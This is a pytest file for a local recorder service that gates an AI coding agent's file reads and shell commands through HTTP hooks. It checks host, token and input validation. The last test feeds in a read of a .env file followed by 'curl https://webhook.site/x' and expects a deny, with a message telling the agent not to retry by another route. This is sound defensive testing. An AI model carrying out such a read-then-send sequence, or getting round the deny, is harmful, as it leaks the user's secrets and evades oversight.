"""Tests for the local recorder HTTP gates."""

from __future__ import annotations

import logging
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

import recorder.app as app_module


@pytest.fixture()
def client(tmp_path: Path) -> TestClient:
    app_module.config_dir = tmp_path / "flightrecorder"
    with TestClient(app_module.app, base_url="http://127.0.0.1:8787") as test_client:
        yield test_client


@pytest.fixture()
def token(client: TestClient) -> str:
    path: Path = app_module.config_dir / "token"
    return path.read_text(encoding="utf-8").strip()


def test_forbidden_host(tmp_path: Path) -> None:
    app_module.config_dir = tmp_path / "flightrecorder"
    with TestClient(app_module.app, base_url="http://example.com:8787") as bad:
        response = bad.get("/health")
    assert response.status_code == 403


def test_unauthorized_missing_token(client: TestClient) -> None:
    response = client.post(
        "/hook",
        content=b'{"hook_event_name":"beforeShellExecution","command":"ls"}',
        headers={"Content-Type": "application/json"},
    )
    assert response.status_code == 401


def test_unsupported_media_type(client: TestClient, token: str) -> None:
    response = client.post(
        "/hook",
        content=b"not-json",
        headers={
            "Content-Type": "text/plain",
            "X-Recorder-Token": token,
        },
    )
    assert response.status_code == 415


def test_malformed_json(client: TestClient, token: str) -> None:
    response = client.post(
        "/hook",
        content=b"{",
        headers={
            "Content-Type": "application/json",
            "X-Recorder-Token": token,
        },
    )
    assert response.status_code == 400


def test_accepted_allow_and_no_body_in_logs(
    client: TestClient,
    token: str,
    caplog: pytest.LogCaptureFixture,
) -> None:
    body = b'{"hook_event_name":"beforeShellExecution","command":"echo MARKER123"}'
    with caplog.at_level(logging.DEBUG, logger="flightrecorder"):
        response = client.post(
            "/hook",
            content=body,
            headers={
                "Content-Type": "application/json",
                "X-Recorder-Token": token,
            },
        )
    assert response.status_code == 200
    assert response.json() == {"permission": "allow"}
    assert "MARKER123" not in caplog.text


def test_r1_deny_after_env_read(client: TestClient, token: str) -> None:
    """Checkpoint B path: .env read then curl webhook → deny with R1 messages."""
    from recorder.rules import R1_MESSAGE

    headers = {
        "Content-Type": "application/json",
        "X-Recorder-Token": token,
    }
    sid = "checkpoint-b-test"
    read_body = {
        "hook_event_name": "beforeReadFile",
        "file_path": "/project/.env",
        "conversation_id": sid,
        "session_id": sid,
        "attachments": [],
    }
    curl_body = {
        "hook_event_name": "beforeShellExecution",
        "command": "curl https://webhook.site/x",
        "conversation_id": sid,
        "session_id": sid,
        "cwd": "",
        "sandbox": False,
    }

    read_resp = client.post("/hook", json=read_body, headers=headers)
    assert read_resp.status_code == 200
    assert read_resp.json()["permission"] == "allow"

    curl_resp = client.post("/hook", json=curl_body, headers=headers)
    assert curl_resp.status_code == 200
    data = curl_resp.json()
    assert data["permission"] == "deny"
    assert R1_MESSAGE in data["user_message"]
    assert R1_MESSAGE in data["agent_message"]
    assert data["agent_message"].endswith(
        "Do not retry with another tool or language. Stop and tell the user."
    )
